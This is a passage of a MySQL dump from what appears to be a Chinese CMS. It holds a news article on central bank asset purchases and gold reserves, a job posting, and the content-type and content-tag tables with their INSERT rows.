style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">摩根大通统计的数据显示，今年英国退欧公投后，欧英日三大央行的季度资产购买规模连创新高。目前美欧英日四大央行的资产负债表已高达13万亿美元之巨，已占全球GDP的40%。预计在今年最后一个季度，欧英日三大央行将“加印”5060亿美元在市场上购买资产，创2009年美联储首推QE以来的最大季度规模。高盛表示，基于全球经济增长仍面临持续下行风险，同时市场可能仍在质疑货币政策应对任何经济潜在冲击的能力。因此，金价跌破每盎司1250美元可能是一个战略性的购买机会。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">值得关注的是，中国央行一直是购买黄金的主力。最新数据显示，截至9月末，国内黄金储备从2014年6月的1054.1吨大幅增加74%至1838.53吨。据中国黄金协会报导，2015年中国生产黄金515.88吨，黄金产量连续九年保持世界第一，黄金消费量连续三年保持世界第一。今年有望继续保持这一势头。不过，今年的黄金需求较往年有明显的回落。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">来自Wind数据统计显示，目前，共有4家拥有黄金业务的上市公司发布了公司的前三季度业绩预报，而从预报结果来看，金价的变化，让这些公司的投资者暂时松了口气。“预计前三季度归属于上市公司股东的净利润变动幅度为增长350.00%至400.00%；同期归属于上市公司股东的净利润变动区间为9847.85万元至10942.05万元；业绩变动的原因是成本下降，黄金价格上升。”</p><p><br/></p>',NULL,NULL,NULL);
INSERT INTO `jc_content_txt` (`content_id`,`txt`,`txt1`,`txt2`,`txt3`) VALUES (140,'<p>任职资格:<br/>1、大专及以上学历，计算机相关专业<br/>2、有一年及以上Java或者安卓开发经验者优先考虑<br/>3、有责任心，能独立思考问题</p>',NULL,NULL,NULL);

#
# Source for table jc_content_type
#

CREATE TABLE `jc_content_type` (
  `type_id` int(11) NOT NULL,
  `type_name` varchar(20) NOT NULL COMMENT '名称',
  `img_width` int(11) DEFAULT NULL COMMENT '图片宽',
  `img_height` int(11) DEFAULT NULL COMMENT '图片高',
  `has_image` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有图片',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`type_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容类型表';

#
# Dumping data for table jc_content_type
#

INSERT INTO `jc_content_type` (`type_id`,`type_name`,`img_width`,`img_height`,`has_image`,`is_disabled`) VALUES (1,'普通',100,100,0,0);
INSERT INTO `jc_content_type` (`type_id`,`type_name`,`img_width`,`img_height`,`has_image`,`is_disabled`) VALUES (2,'图文',510,288,1,0);
INSERT INTO `jc_content_type` (`type_id`,`type_name`,`img_width`,`img_height`,`has_image`,`is_disabled`) VALUES (3,'焦点',280,200,1,0);
INSERT INTO `jc_content_type` (`type_id`,`type_name`,`img_width`,`img_height`,`has_image`,`is_disabled`) VALUES (4,'头条',0,0,0,0);

#
# Source for table jc_contenttag
#

CREATE TABLE `jc_contenttag` (
  `content_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  KEY `fk_jc_content_tag` (`tag_id`),
  KEY `fk_jc_tag_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容标签关联表';

#
# Dumping data for table jc_contenttag
#

INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,8,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,9,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,10,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,11,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,12,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,13,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,14,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,15,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,16,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,17,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,18,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (2,19,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,61,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,62,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,3,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,63,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,64,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,65,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,66,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,67,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (7,68,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,102,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,8,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,9,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,103,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,104,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,105,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,107,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,108,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,109,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,15,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (12,110,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,111,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,112,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,113,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,71,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,114,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,115,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,116,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (13,117,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,102,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,118,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,119,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,120,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,121,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,122,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,123,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (14,124,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,139,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,140,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,141,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,142,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,143,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,144,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (23,145,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,149,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,150,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,102,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,151,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,152,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,153,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (27,154,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,155,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,156,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,157,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,158,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,159,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,160,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,161,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,162,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (28,163,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,164,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,165,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,166,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,167,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,168,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,169,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,170,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,171,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,172,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,173,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,174,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (29,175,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,176,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,177,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,178,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,179,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,180,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,181,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,182,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,183,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,184,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,185,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,186,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,187,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,188,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (30,189,13);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,199,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,200,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,201,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,24,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,202,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,203,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,204,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,205,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,206,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,207,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,208,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,209,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (33,210,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,230,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,231,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,232,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,233,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,234,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,235,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,236,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,235,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,237,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,238,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,239,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,240,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,241,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,242,13);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,243,14);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,244,15);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,245,16);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (36,246,17);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,247,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,248,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,249,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,250,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,251,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,252,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,253,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,254,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,255,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,256,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,257,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (37,258,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,42,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,271,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,10,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,272,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,273,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,274,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,275,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (39,276,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (43,286,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (43,287,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (43,288,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (44,289,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (44,290,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (44,291,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (45,292,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (45,293,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (46,436,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (47,436,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (47,437,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (47,298,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (47,438,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (48,436,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (48,437,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (48,298,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (49,436,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (49,298,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (49,439,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (50,436,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (50,437,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (51,298,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (51,438,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,322,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,323,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,324,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,325,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,326,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,327,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,328,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (53,329,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (55,340,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (55,269,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (55,341,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (55,342,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,351,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,352,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,353,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,354,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,355,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,59,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,356,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,357,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (57,358,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (59,365,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (59,366,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (59,367,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (59,368,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (59,369,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (59,370,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (61,375,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (61,376,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (61,377,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (61,378,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (61,379,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,388,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,21,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,389,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,390,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,391,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,392,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,393,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,394,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,395,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (63,396,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (48,438,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (48,439,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (47,439,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (46,437,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (46,298,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (46,438,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (46,439,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,500,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,212,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,501,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,502,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,503,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,212,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,504,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,505,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,506,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,507,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (111,508,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,509,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,510,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,511,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,512,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,513,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,514,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,515,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,516,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,517,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (112,518,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,519,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,520,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,521,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,522,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,523,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,524,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,525,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,526,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (113,527,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,501,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,528,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,529,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,530,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,531,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,532,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,533,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,534,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,535,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,536,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (114,537,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,42,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,538,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,537,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,539,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,540,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,541,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,542,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,543,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (115,544,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,545,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,546,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,547,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,548,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,549,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,550,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,551,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,552,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,553,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,59,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (116,554,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,555,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,556,1);
